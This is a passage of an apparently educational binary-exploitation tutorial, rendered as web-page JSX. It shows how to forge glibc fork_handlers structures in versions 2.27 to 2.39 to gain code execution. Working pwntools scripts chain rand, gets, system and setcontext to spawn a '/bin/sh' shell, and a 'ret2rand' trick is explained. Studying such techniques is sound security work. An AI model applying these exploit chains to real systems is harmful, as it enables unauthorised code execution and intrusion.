",(0,r.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.30/source/nptl/register-atfork.c#L110",children:"2.30"}),")."]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (109).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsxs)("p",{children:[(0,r.jsx)("code",{children:"2.29"})," first ",(0,r.jsx)("code",{children:"prepare_handler"})," call"]})})]}),"\n",(0,r.jsxs)(n.p,{children:["Above we see that the ",(0,r.jsx)(n.code,{children:"used"})," field is loaded into ",(0,r.jsx)(n.code,{children:"rax"}),", but not into ",(0,r.jsx)(n.code,{children:"rdi"}),". But after the first call:"]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (110).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsxs)("p",{children:[(0,r.jsx)("code",{children:"2.29"})," second ",(0,r.jsx)("code",{children:"prepare_handler"})," call"]})})]}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"used"})," ",(0,r.jsx)(n.em,{children:"is"})," loaded into ",(0,r.jsx)(n.code,{children:"rdi"}),". Weird..."]}),"\n",(0,r.jsxs)(n.p,{children:["I can't quite explain why this happens, but this is more just a word of warning, that this isn't an exact science. If you find this happening, you can always just start by doing a ",(0,r.jsx)(n.code,{children:"ret"})," to get past the first call, which would also be compatible with ",(0,r.jsx)(n.code,{children:"2.30+"}),"."]}),"\n",(0,r.jsx)(n.p,{children:"And if it doesn't happen at all?"}),"\n",(0,r.jsxs)(n.p,{children:["Well, ",(0,r.jsx)(n.code,{children:"rdi"})," shouldn't be used by anything else if it's not used for ",(0,r.jsx)(n.code,{children:"used"}),", so ",(0,r.jsx)(n.a,{href:"rop-2.34+/ret2gets",children:"ret2gets"})," would also be a possibility, however I am yet to test it."]}),"\n",(0,r.jsx)(n.h2,{id:"236",children:"2.36+"}),"\n",(0,r.jsxs)(n.p,{children:["(The specific version used here is ",(0,r.jsx)(n.code,{children:"2.39"}),")"]}),"\n",(0,r.jsxs)(n.p,{children:["You'll have noticed that the previous section was specifically for ",(0,r.jsx)(n.code,{children:"2.28-2.35"}),". This is because the implementation of ",(0,r.jsx)(n.code,{children:"fork_handlers"})," changes throughout the versions. So, what's changed now?"]}),"\n",(0,r.jsxs)(n.p,{children:["Well, not much actually. Firstly, the ",(0,r.jsx)(n.code,{children:"fork_handler"})," struct has a new field: ",(0,r.jsx)(n.code,{children:"id"})]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (66).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsx)("p",{children:(0,r.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.39/source/include/register-atfork.h#L23",children:"fork_handler"})})})]}),"\n",(0,r.jsxs)(n.p,{children:["And a separate function for running ",(0,r.jsx)(n.code,{children:"prefork"})," handlers has been created:"]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (90).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsx)("p",{children:(0,r.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.39/source/posix/fork.c#L40",children:"__libc_fork"})})})]}),"\n",(0,r.jsxs)(n.p,{children:["The function for running ",(0,r.jsx)(n.code,{children:"prefork"})," handlers isn't much different either:"]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (91).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsx)("p",{children:(0,r.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.39/source/posix/register-atfork.c#L128",children:"__run_prefork_handlers"})})})]}),"\n",(0,r.jsxs)(n.p,{children:["The main addition is the use of ",(0,r.jsx)(n.code,{children:"id"}),". What seems to be implied by the comments here, is that now each handler has a unique ",(0,r.jsx)(n.code,{children:"id"}),", which increments each time a new one is added. This means ones added later will have a larger ",(0,r.jsx)(n.code,{children:"id"}),". Due to the different locking pattern here, handlers could be de-registered and/or registered when a ",(0,r.jsx)(n.code,{children:"prepare_handler"})," is being executed, so it ensures that only ones that were present before the current one was are executed, therefore skipping ones with a ",(0,r.jsx)(n.em,{children:"higher"})," ",(0,r.jsx)(n.code,{children:"id"}),"."]}),"\n",(0,r.jsxs)(n.p,{children:["For us, all this changes is that the structure of ",(0,r.jsx)(n.code,{children:"fork_handler"})," is different, and we just need to include an ",(0,r.jsx)(n.code,{children:"id"})," field, where it's increasing with each handler. The updated handlers are as follows:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"def header(addr, size):\n    return flat({\n        0x00: size,\n        0x10: addr\n    })\n\ndef handler_array(*funcs):\n    assert funcs\n    data = bytearray(0x28*len(funcs))\n    for i, func in enumerate(funcs[::-1]):\n        off = i*0x28\n        data[off:off+8] = p64(func)\n        data[off+0x20:off+0x28] = p64(i)\n    return data\n\ndef forge_split(addr, *funcs, rdi=None):\n    array = handler_array(*funcs)\n    if rdi is not None:\n        size = rdi\n        assert size >= len(funcs)\n        addr = (addr - (size-len(funcs))*0x28) % (1<<64)\n    else:\n        size = len(funcs)\n    return header(addr, size), array\n\ndef forge(addr, *funcs, rdi=None):\n    hdr, arr = forge_split(addr+0x18, *funcs, rdi=rdi)\n    return hdr + arr\n"})}),"\n",(0,r.jsx)(n.h3,{id:"revenge-of-the-seccomp",children:"Revenge of the seccomp!"}),"\n",(0,r.jsxs)(n.p,{children:["While these changes don't affect the regular cases for ",(0,r.jsx)(n.code,{children:'system("/bin/sh")'})," or ",(0,r.jsx)(n.code,{children:"setcontext"}),", it (indirectly) affects the ",(0,r.jsx)(n.code,{children:"setcontext"})," case where we need to skip ",(0,r.jsx)(n.code,{children:"sigprocmask"}),". In the version of glibc I used for the demo, ",(0,r.jsx)(n.code,{children:"rdx"})," is used by ",(0,r.jsx)(n.code,{children:"__run_prefork_handlers"}),":"]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (92).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsxs)("p",{children:["After ",(0,r.jsx)("code",{children:"prepare_handler"})," call."]})})]}),"\n",(0,r.jsxs)(n.p,{children:["Here we see at ",(0,r.jsx)(n.code,{children:"+128"})," that ",(0,r.jsx)(n.code,{children:"rdx=5*r14"}),", where ",(0,r.jsx)(n.code,{children:"r14"})," is ",(0,r.jsx)(n.code,{children:"sl"})," (the number of handlers). ",(0,r.jsx)(n.code,{children:"rdx"})," then gets multiplied by ",(0,r.jsx)(n.code,{children:"8"}),", which ultimately means ",(0,r.jsx)(n.code,{children:"r14"})," got multiplied by ",(0,r.jsx)(n.code,{children:"40"}),"/",(0,r.jsx)(n.code,{children:"0x28"}),", (the size of ",(0,r.jsx)(n.code,{children:"fork_handler"}),"). This is in preparation for the loop where it checks the ",(0,r.jsx)(n.code,{children:"id"})," fields, which is why it actually points to the previous handler's ",(0,r.jsx)(n.code,{children:"id"})," field (",(0,r.jsx)(n.code,{children:"-0x30"})," instead of ",(0,r.jsx)(n.code,{children:"-0x28"}),")."]}),"\n",(0,r.jsxs)(n.p,{children:["In this case, we can actually set ",(0,r.jsx)(n.code,{children:"used"})," to a value that, when multiplied by 5, points to a context. This will make ",(0,r.jsx)(n.code,{children:"rdi"})," a junk value, which means you can't use ",(0,r.jsx)(n.code,{children:"gets"})," to populate the context (RIP), but apart from that, it's no problem!"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'ret = ROP(libc).find_gadget(["ret"]).address\n\naddr = libc.sym.fork_handlers\n\naddr_ctx = addr+0x100\naddr_ctx += (-addr_ctx) % 5\nrdi = addr_ctx // 5\n\ndata = forge(addr, ret, libc.sym.setcontext+45, rdi=rdi)\ndata = data.ljust(addr_ctx-addr, b"X")\ndata += setcontext({\n    "rdi": next(libc.search(b"/bin/sh\\x00")),\n    "rsi": 0,\n    "rdx": 0,\n    "rip": libc.sym.execve,\n    "rsp": addr_ctx+0x200\n}, addr_ctx)\nassert b"\\n" not in data\n\np.sendlineafter(b"Enter address, size and data: ", f"{addr} {len(data)+2} ".encode() + data)\np.interactive()\n'})}),"\n",(0,r.jsx)(n.h2,{id:"227-and-prior",children:"2.27 and prior"}),"\n",(0,r.jsxs)(n.p,{children:["(The specific version used here is ",(0,r.jsx)(n.code,{children:"2.27"}),")"]}),"\n",(0,r.jsxs)(n.p,{children:["You may be wondering why I'm ending with the earliest implementation. This is because the later versions are more trivial, both in how ",(0,r.jsx)(n.code,{children:"fork_handlers"})," is implemented, but also how they're exploited. This is because we no longer have the ",(0,r.jsx)(n.code,{children:"rdi"})," control trick through the ",(0,r.jsx)(n.code,{children:"used"})," field."]}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"fork_handler"})," is now defined as:"]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (93).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsx)("p",{children:(0,r.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.27/source/sysdeps/nptl/fork.h#L31",children:"fork_handler"})})})]}),"\n",(0,r.jsx)(n.p,{children:"A few more fields than before:"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"next"}),": Points to next handler, as ",(0,r.jsx)(n.code,{children:"__fork_handlers"})," is now a singly linked list."]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"refcntr"}),": Reference count of this handler."]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"need_signal"}),": Unused in ",(0,r.jsx)(n.code,{children:"fork"}),", so we'll ignore it."]}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["We're no longer using a ",(0,r.jsx)(n.code,{children:"dynarray"}),", so there is no ",(0,r.jsx)(n.code,{children:"used"})," field to control to gain ",(0,r.jsx)(n.code,{children:"rdi"})," control (cringe). Let's have a look at ",(0,r.jsx)(n.code,{children:"fork"})," then:"]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (94).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsx)("p",{children:(0,r.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.27/source/sysdeps/nptl/fork.c#L48",children:"__libc_fork"})})})]}),"\n",(0,r.jsxs)(n.p,{children:["Not much so far, it just checks ",(0,r.jsx)(n.code,{children:"THREAD_SELF"})," for if the process is multi-threaded. There's also no function for handing the fork handlers anymore: it's incorporated into ",(0,r.jsx)(n.code,{children:"fork"})," itself."]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (96).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsxs)("p",{children:[(0,r.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.27/source/sysdeps/nptl/fork.c#L65",children:"__libc_fork"}),": Access ",(0,r.jsx)("code",{children:"__fork_handlers"})]})})]}),"\n",(0,r.jsxs)(n.p,{children:["First it needs to access the root of the linked list of handlers: ",(0,r.jsx)(n.code,{children:"__fork_handlers"}),". However since the process could be multi-threaded ",(0,r.jsx)(n.del,{children:"and they didn't dicover locking yet"})," it needs to do it in a thread-safe way (hence the weirdness with ",(0,r.jsx)(n.code,{children:"atomic_full_barrier"})," etc.) but the jist is that it will grab ",(0,r.jsx)(n.code,{children:"__fork_handlers"})," if it exists, and (atomically) increment the ",(0,r.jsx)(n.code,{children:"refcntr"})," to claim ownership of it, ensuring it doesn't get freed while it's in use here."]}),"\n",(0,r.jsx)(n.admonition,{type:"info",children:(0,r.jsxs)(n.p,{children:["A lock doesn't seem to be needed, as the ",(0,r.jsx)(n.code,{children:"fork_handler"})," entries are constant (besides ",(0,r.jsx)(n.code,{children:"refcntr"}),", which is handled atomically, therefore not susceptible to racing). While it does work, the code with locking is just nicer."]})}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (97).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsxs)("p",{children:[(0,r.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.27/source/sysdeps/nptl/fork.c#L92",children:"__libc_fork"}),": Executing ",(0,r.jsx)("code",{children:"prepare_handler"}),"'s"]})})]}),"\n",(0,r.jsxs)(n.p,{children:["This now seems familiar, but instead of an accessing an array, it's cycling through a linked list. It also saves the handlers it uses, so that it can the same ones later for ",(0,r.jsx)(n.code,{children:"parent_handler"})," and ",(0,r.jsx)(n.code,{children:"child_handler"}),". To do this, it needs to claim ownership, so it increments the ",(0,r.jsx)(n.code,{children:"refcntr"}),"."]}),"\n",(0,r.jsxs)(n.p,{children:["Importantly, there's no function calls with arguments present here, except for ",(0,r.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.27/source/stdlib/alloca.h#L35",children:"alloca"})," (compiler builtin) and ",(0,r.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.27/source/sysdeps/x86_64/atomic-machine.h#L282",children:"atomic_increment"})," (",(0,r.jsx)(n.code,{children:"asm"})," block). So unlike ",(0,r.jsx)(n.code,{children:"2.28+"}),", there's no ",(0,r.jsx)(n.code,{children:"rdi"})," control, because no functions (with a first argument) are called."]}),"\n",(0,r.jsxs)(n.p,{children:["We can write methods to forge a ",(0,r.jsx)(n.code,{children:"fork_handler"})," list as follows:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'def forge(addr, *funcs):\n    assert funcs\n    data = b""\n    for i, func in enumerate(funcs):\n        next = addr+len(data)+0x30\n        data += flat({\n            0x00: next if i==len(funcs)-1 else 0,\n            0x08: func,\n            0x28: p32(1),\n        }, length=0x30)\n    return data\n\ndef forge_packed(addr, *funcs, smallest=False):\n    assert funcs\n    if smallest:\n        # some refcntrs are outside our data\n        # (except the first one, which we need to control)\n        # these will be incremented, and potentially corrupt some memory\n        # be careful when using this\n        size = max(0x28+4, 0x10*len(funcs))\n    else:\n        # all refcntrs are contained in our data\n        size = 0x28 + 0x10*len(funcs) - 0xc\n    data = bytearray(size)\n    addrs = [addr+0x10*i for i in range(1, len(funcs))] + [0]\n    for i, (addr, func) in enumerate(zip(addrs, funcs)):\n        off = i*0x10\n        data[off:off+0x10] = p64(addr) + p64(func)\n    for i in range(len(funcs)):\n        off = 0x28 + 0x10*i\n        if off+4 > len(data):\n            break\n        val = u32(bytes(data[off:off+4])) - 1\n        # the first refcntr must be non-zero\n        # otherwise it\'ll loop forever\n        if i == 0:\n            assert val != 0\n        data[off:off+4] = p32(val % (1<<32))\n    return bytes(data)\n'})}),"\n",(0,r.jsxs)(n.p,{children:["You can do a standard array (",(0,r.jsx)(n.code,{children:"forge"}),"), or you can utilise the unused space to pack it as much as possible (",(0,r.jsx)(n.code,{children:"forge_packed"}),"). Both must contain at least the first ",(0,r.jsx)(n.code,{children:"refcntr"})," though, as we need to ensure that that is non-zero. The rest of the ",(0,r.jsx)(n.code,{children:"refcntr"}),"'s will be incremented, and if these are outside our data, they ",(0,r.jsx)(n.em,{children:"might"})," corrupt other data, but if that's not a concern, then you can use ",(0,r.jsx)(n.code,{children:"smallest=True"}),"."]}),"\n",(0,r.jsx)(n.h3,{id:"ret2rand",children:"ret2rand"}),"\n",(0,r.jsxs)(n.p,{children:["Therefore the only way we can control ",(0,r.jsx)(n.code,{children:"rdi"})," is through ",(0,r.jsx)(n.code,{children:"prepare_handler"})," calls. We need a function that will populate ",(0,r.jsx)(n.code,{children:"rdi"})," with some writable address, which we could then write to using ",(0,r.jsx)(n.code,{children:"gets"}),".  ",(0,r.jsx)(n.a,{href:"/pwn/pwn/rop-2.34+/ret2gets",children:"ret2gets"})," is unfortunately not very applicable here, as it's quite limited prior to ",(0,r.jsx)(n.code,{children:"2.30"})," (",(0,r.jsx)(n.a,{href:"rop-2.34+/ret2gets#glibc-prior-to-2.30",children:"see here"}),")."]}),"\n",(0,r.jsxs)(n.p,{children:["Thankfully, I was able to find an alternative: ",(0,r.jsx)(n.code,{children:"rand"}),"."]}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.a,{href:"https://linux.die.net/man/3/rand",children:"rand"})," is a psuedo random number generator, and with that comes the need to keep track of the random state. In this case, that state is ",(0,r.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.27/source/stdlib/random.c#L160",children:"unsafe_state"}),", which is of type ",(0,r.jsx)(n.code,{children:"random_state"}),":"]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (100).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsx)("p",{children:(0,r.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.27/source/stdlib/random.c#L287",children:"random"})})})]}),"\n",(0,r.jsxs)(n.p,{children:["This state is passed to ",(0,r.jsx)(n.code,{children:"__random_r"}),", as the first argument ","\ud83d\udc40",". What's more is that ",(0,r.jsx)(n.code,{children:"__random_r"})," is relatively simple, doesn't make any function calls, or alter the pointer itself, which means that it can just keep ",(0,r.jsx)(n.code,{children:"unsafe_state"})," in ",(0,r.jsx)(n.code,{children:"rdi"})," (we'll look at this in a bit)."]}),"\n",(0,r.jsx)(n.h4,{id:"but-what-about-the-locking",children:"But what about the locking?"}),"\n",(0,r.jsxs)(n.p,{children:["Well that's a good question, because we've seen before (in ",(0,r.jsx)(n.a,{href:"rop-2.34+/ret2gets#io_stdfile_0_lock-in-rdi",children:"ret2gets"}),") that locking ",(0,r.jsx)(n.code,{children:"lock"})," can result in ",(0,r.jsx)(n.code,{children:"lock"})," being loaded into ",(0,r.jsx)(n.code,{children:"rdi"}),"."]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (111).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsx)("p",{children:(0,r.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.27/source/sysdeps/nptl/libc-lockP.h#L210",children:"__libc_lock_unlock"})})})]}),"\n",(0,r.jsxs)(n.p,{children:["Ah, it's our good ol' friend ",(0,r.jsx)(n.code,{children:"lll_unlock"}),"."]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (103).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsxs)("p",{children:[(0,r.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.27/source/sysdeps/unix/sysv/linux/x86_64/lowlevellock.h#L196",children:"lll_unlock"}),": Written in assembly"]})})]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (104).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsxs)("p",{children:[(0,r.jsx)("code",{children:"lll_unlock"})," in ",(0,r.jsx)("code",{children:"__random"})]})})]}),"\n",(0,r.jsxs)(n.p,{children:["Just like in ",(0,r.jsx)(n.a,{href:"rop-2.34+/ret2gets#glibc-prior-to-2.30",children:"ret2gets prior to 2.30"}),", it only unlocks by using ",(0,r.jsx)(n.code,{children:"lll_unlock_wait_private"})," when it's multi-threaded, thus the single thread case works flawlessly and doesn't touch ",(0,r.jsx)(n.code,{children:"rdi"}),"."]}),"\n",(0,r.jsxs)(n.p,{children:["The multi-threaded case is a bit more complex, but if it's locked with the value ",(0,r.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.27/source/sysdeps/unix/sysv/linux/x86_64/lowlevellock.h#L57",children:"LLL_LOCK_INITIALIZER_LOCKED"})," (1), then it also doesn't touch ",(0,r.jsx)(n.code,{children:"rdi"})," (yay). However, ",(0,r.jsx)(n.code,{children:"lock"})," can also contain the value ",(0,r.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.27/source/sysdeps/unix/sysv/linux/x86_64/lowlevellock.h#L58",children:"LLL_LOCK_INITIALIZER_WAITERS"})," (2), in which case the ",(0,r.jsx)(n.code,{children:"dec"})," won't result in ",(0,r.jsx)(n.code,{children:"0"}),", and will execute ",(0,r.jsx)(n.code,{children:"lll_unlock_wait_private"}),", thus clobbering ",(0,r.jsx)(n.code,{children:"rdi"}),"."]}),"\n",(0,r.jsxs)(n.p,{children:["This should be unlikely to happen to ",(0,r.jsx)(n.code,{children:"rand"}),"'s ",(0,r.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.27/source/stdlib/random.c#L197",children:"lock"}),", as you'd need multiple threads trying to access ",(0,r.jsx)(n.code,{children:"rand"})," at the same time, but it's not impossible, so be careful."]}),"\n",(0,r.jsx)(n.h4,{id:"exploitation-1",children:"Exploitation"}),"\n",(0,r.jsxs)(n.p,{children:["So let's go back to ",(0,r.jsx)(n.code,{children:"random"}),", specifically ",(0,r.jsx)(n.code,{children:"__random_r"}),". We can use ",(0,r.jsx)(n.code,{children:"rand"})," followed by ",(0,r.jsx)(n.code,{children:"gets"})," to write to the ",(0,r.jsx)(n.code,{children:"unsafe_state"}),", but we'll need to call ",(0,r.jsx)(n.code,{children:"rand"})," again to put ",(0,r.jsx)(n.code,{children:"unsafe_state"})," back into ",(0,r.jsx)(n.code,{children:"rdi"})," after ",(0,r.jsx)(n.code,{children:"gets"}),". And if we call ",(0,r.jsx)(n.code,{children:"rand"})," using a corrupted ",(0,r.jsx)(n.code,{children:"unsafe_state"}),", then we could cause a crash?"]}),"\n",(0,r.jsxs)(n.p,{children:["So we need to conform to ",(0,r.jsx)(n.code,{children:"random_state"}),":"]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (105).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsx)("p",{children:(0,r.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.27/source/stdlib/stdlib.h#L423",children:"random_data"})})})]}),"\n",(0,r.jsxs)(n.p,{children:["But this contains multiple pointers, including at the beginning, where we might want to put ",(0,r.jsx)(n.code,{children:"/bin/sh"})," string for example! But are these always used? Let's check ",(0,r.jsx)(n.code,{children:"__random_r"}),":"]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (106).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsx)("p",{children:(0,r.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.27/source/stdlib/random_r.c#L353",children:"__random_r"})})})]}),"\n",(0,r.jsxs)(n.p,{children:["At first glance, we can see the ",(0,r.jsx)(n.code,{children:"fptr"}),", ",(0,r.jsx)(n.code,{children:"rptr"}),", ",(0,r.jsx)(n.code,{children:"state"})," pointers being used in the ",(0,r.jsx)(n.code,{children:"else"})," clause. However, there's an interesting case: ",(0,r.jsx)(n.code,{children:"buf->rand_type == TYPE_0"}),". This seems to be much simpler, and doesn't use ",(0,r.jsx)(n.code,{children:"fptr"})," or ",(0,r.jsx)(n.code,{children:"rptr"}),"! It does still use ",(0,r.jsx)(n.code,{children:"state"}),", but as long as it's populated with a writable address, it won't ",(0,r.jsx)(n.code,{children:"SEGFAULT"}),". The default ",(0,r.jsx)(n.code,{children:"rand_type"})," is ",(0,r.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.27/source/stdlib/random.c#L119",children:"TYPE_3"}),", but we can easily overwrite it to ",(0,r.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.27/source/stdlib/random.c#L101",children:"TYPE_0"}),"."]}),"\n",(0,r.jsxs)(n.p,{children:["Putting this together, we arrive at the following for ",(0,r.jsx)(n.code,{children:'system("/bin/sh")'}),":"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'addr = libc.sym.__fork_handlers\ndata = p64(addr+8) + forge_packed(addr+8, libc.sym.rand, libc.sym.gets, libc.sym.rand, libc.sym.system)\nassert b"\\n" not in data\n\nextra_data = flat({\n    0x00: b"/bin/sh\\x00",\n    0x10: libc.sym.randtbl+4,    # the previous `state` field\n    0x18: p32(0),   # TYPE_0\n})\nassert b"\\n" not in extra_data\n\np.sendlineafter(b"Enter address, size and data: ", f"{addr} {len(data)+2} ".encode() + data)\np.sendline(extra_data)\n\np.interactive()\n'})}),"\n",(0,r.jsxs)(n.p,{children:["We're also able to use this for ",(0,r.jsx)(n.code,{children:"setcontext"}),":"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'addr = libc.sym.__fork_handlers\ndata = p64(addr+8) + forge_packed(addr+8, libc.sym.rand, libc.sym.gets, libc.sym.rand, libc.sym.setcontext)\nassert b"\\n" not in data\n\nucontext = setcontext({\n    "rdi": next(libc.search(b"/bin/sh\\x00")),\n    "rsi": 0,\n    "rdx": 0,\n    "rip": libc.sym.execve,\n    "rsp": libc.sym.unsafe_state+0x200\n}, libc.sym.unsafe_state)\n\nextra_data = flat({\n    0x10: libc.sym.randtbl+4,\n    0x18: p32(0),   # TYPE_0\n})\nextra_data += ucontext[len(extra_data):]\nassert b"\\n" not in extra_data\n\np.sendlineafter(b"Enter address, size and data: ", f"{addr} {len(data)+2} ".encode() + data)\np.sendline(extra_data)\n\np.interactive()\n'})}),"\n",(0,r.jsx)(n.h3,{id:"return-of-the-seccomp",children:"Return of the seccomp"}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/91d52t.jpg",alt:""}),(0,r.jsx)("figcaption",{})]}),"\n",(0,r.jsxs)(n.p,{children:["This time our work is actually mostly done for us, because ",(0,r.jsx)(n.code,{children:"2.27"})," and prior, ",(0,r.jsx)(n.code,{children:"setcontext"})," doesn't use ",(0,r.jsx)(n.code,{children:"rdx"})," for the ",(0,r.jsx)(n.code,{children:"ucontext"}),"."]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (107).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsxs)("p",{children:[(0,r.jsx)("code",{children:"setcontext"})," after ",(0,r.jsx)("code",{children:"sigprocmask"})]})})]}),"\n",(0,r.jsxs)(n.p,{children:["So it's just as simple as jumping to ",(0,r.jsx)(n.code,{children:"setcontext+37"})," (or later)."]}),"\n",(0,r.jsx)(n.h2,{id:"detecting-arguments-to-handlers",children:"Detecting arguments to handlers"}),"\n",(0,r.jsxs)(n.p,{children:["It can be quite cumbersome to check the disassembly to see what the arguments are going to be ahead of time. That's why I wrote a script, just like with ",(0,r.jsx)(n.a,{href:"rop-2.34+/ret2gets#detecting-this-behaviour",children:"ret2gets"}),", which will trace ",(0,r.jsx)(n.code,{children:"fork"})," with ",(0,r.jsx)(n.code,{children:"angr"}),", and log what the arguments to each call to ",(0,r.jsx)(n.code,{children:"prepare_handler"})," were."]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"https://gist.github.com/sasha-999/4feff0af21c4d028fd5701e8f11f12c0",children:(0,r.jsx)(n.code,{children:"detect_fork.py"})})}),"\n",(0,r.jsx)(n.h2,{id:"fork---one_gadget",children:"fork -> one_gadget"}),"\n",(0,r.jsxs)(n.p,{children:["So why would we care about this? I mean sure, we can control ",(0,r.jsx)(n.code,{children:"fork"})," to either execute ",(0,r.jsx)(n.code,{children:"system"})," for a shell, or ",(0,r.jsx)(n.code,{children:"setcontext"})," for ROP/shellcode, but that's only useful is there are calls to ",(0,r.jsx)(n.code,{children:"fork"}),". Not all applications will use ",(0,r.jsx)(n.code,{children:"fork"})," after all."]}),"\n",(0,r.jsxs)(n.p,{children:["What about functions in glibc? Surely some of them will use ",(0,r.jsx)(n.code,{children:"fork"}),", after all there's functions like ",(0,r.jsx)(n.code,{children:"system"})," which would create a new process to execute a shell command, right?"]}),"\n",(0,r.jsxs)(n.p,{children:["Well unfortunately not many glibc functions use ",(0,r.jsx)(n.code,{children:"__libc_fork"}),"."]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image (108).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsx)("p",{children:(0,r.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.39/A/ident/__fork",children:"Uses of __fork"})})})]}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.39/source/login/forkpty.c#L34",children:"forkpty"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.39/source/sysdeps/unix/grantpt.c#L207",children:"grantpt"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.39/source/misc/daemon.c#L48",children:"daemon"})}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/oldiopopen.c#L91",children:"_IO_old_popen"})," (not used)"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.39/source/posix/vfork.c#L26",children:"vfork"})," (if the ",(0,r.jsx)(n.code,{children:"vfork"})," syscall doesn't exist)"]}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["The rest, like ",(0,r.jsx)(n.code,{children:"system"})," or ",(0,r.jsx)(n.code,{children:"popen"})," will use an inlined ",(0,r.jsx)(n.code,{children:"clone"})," call."]}),"\n",(0,r.jsxs)("figure",{children:[(0,r.jsx)("img",{src:"/assets/image 